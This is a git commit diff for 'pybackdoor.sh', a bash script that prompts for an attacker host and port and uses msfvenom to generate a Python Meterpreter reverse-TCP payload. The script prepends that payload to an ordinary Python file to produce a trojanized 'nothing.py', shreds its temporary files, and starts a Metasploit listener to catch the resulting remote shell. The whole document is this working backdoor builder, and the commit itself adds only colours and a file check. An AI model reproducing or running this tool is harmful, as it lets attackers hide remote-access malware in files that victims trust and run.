5c62f14e140c0cb468b32990cc440ebca40cacbb
rek292 <83674893+rek292@users.noreply.github.com>
2021-05-07 19:06:29 +0000

    Update pybackdoor.sh

--- pybackdoor.sh
+++ pybackdoor.sh
@@ -1,45 +1,62 @@
 #!/bin/bash
 # pybackdoor V1.0
+# colors
+green=$'\e[0;32m'
+red=$'\e[1;31m'
+yellow=$'\e[1;33m'
+blue=$'\e[1;34m'
+cyan=$'\e[0;36m'
+lightgreen=$'\e[1;32m'
+white=$'\e[1;37m'
+STOP="\e[0m"
 
 clear
 figlet -f big PYBACKDOOR
 echo ""
-read -p "[ + ] LHOST : " lh
+read -p "$cyan[ + ] LHOST : " lh
 echo ""
-read -p "[ + ] LPORT : " lp
+read -p "$cyan[ + ] LPORT : " lp
 echo ""
-read -p "[ + ] path to Original File [ PYTHON ] : " pyfile
+read -p "$cyan[ + ] path to Original File [ PYTHON ] : " pyfile
 echo ""
+if [ -f $pyfile ]; then
+        echo "$lightgreen[ + ] File $(basename $pyfile) Found!"
+        echo ""
+else
+        echo "$red[ - ] File $(basename $pyfile) Not Found!"
+        echo ""
+exit
+fi
 sleep 0.5
-echo "[ * ] Generating the backdoor ..." | pv -qL 10
+echo "$lightgreen[ * ] Generating the backdoor ..." | pv -qL 10
 echo ""
 xterm -T "Creating Backdoor ..." -e "msfvenom -p python/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o temp.txt" & > /dev/null2>&1
 PID=$!
 wait $PID
 sleep 1
-echo "[ # ] Encrypting shellcode ..." | pv -qL 10
+echo "$lightgreen[ # ] Encrypting shellcode ..." | pv -qL 10
 echo ""
 cat temp.txt > nothing.py
 echo '' >> nothing.py
 cat $pyfile >> nothing.py
 sleep 0.5
-echo "[ + ] Shellcode encrypted ..." | pv -qL 10
+echo "$lightgreen[ + ] Shellcode encrypted ..." | pv -qL 10
 echo ""
 sleep 1
-echo "[ + ] Backdoor saved in folder --> $PWD/nothing.py" | pv -qL 10
+echo "$lightgreen[ + ] Backdoor saved in folder --> $PWD/nothing.py" | pv -qL 10
 echo ""
 sleep 1.5
-echo "[ + ] Cleaning up ... " | pv -qL 10
+echo "$lightgreen[ + ] Cleaning up ... " | pv -qL 10
 echo ""
 shred -n 5 temp.txt -u
-echo "[ + ] OK ... " | pv -qL 10
+echo "$lightgreen[ + ] OK ... " | pv -qL 10
 echo ""
 echo ""
 sleep 1.1
 x=0
 while [ $x = 0 ]
 do
-read -p "[ ? ] Do you want to start Listener? [ Y/n ] : " listener1
+read -p "$yellow[ ? ] Do you want to start Listener? [ Y/n ] : " listener1
 	case "$listener1" in
 n)
 echo '' && exit
@@ -47,7 +64,7 @@ echo '' && exit
 Y)
 echo ""
 sleep 0.7
-echo "[ + ] Creating handler.rc file ..." | pv -qL 10
+echo "$lightgreen[ + ] Creating handler.rc file ..." | pv -qL 10
 echo ""
 sleep 0.5
 touch handler.rc && chmod 777 handler.rc
@@ -56,19 +73,19 @@ echo set payload python/meterpreter/reverse_tcp >> handler.rc
 echo set LHOST $lh >> handler.rc
 echo set LPORT $lp >> handler.rc
 echo exploit >> handler.rc
-echo "[ + ] handler.rc created successfully ..." | pv -qL 10
+echo "$lightgreen[ + ] handler.rc created successfully ..." | pv -qL 10
 echo ""
 sleep 1
-echo "[ + ] Starting Metasploit ... " | pv -qL 10
+echo "$blue[ + ] Starting Metasploit ... " | pv -qL 10
 echo ""
 sleep 0.8
 msfconsole -r handler.rc
 echo ""
 echo ""
-echo "[ + ] Cleaning handler.rc ... " | pv -qL 10
+echo "$lightgreen[ + ] Cleaning handler.rc ... " | pv -qL 10
 echo ""
 shred -n 5 handler.rc -u
-echo "[ + ] OK ..." | pv -qL 10
+echo "$lightgreen[ + ] OK ..." | pv -qL 10
 echo ""
 sleep 1.1
 exit
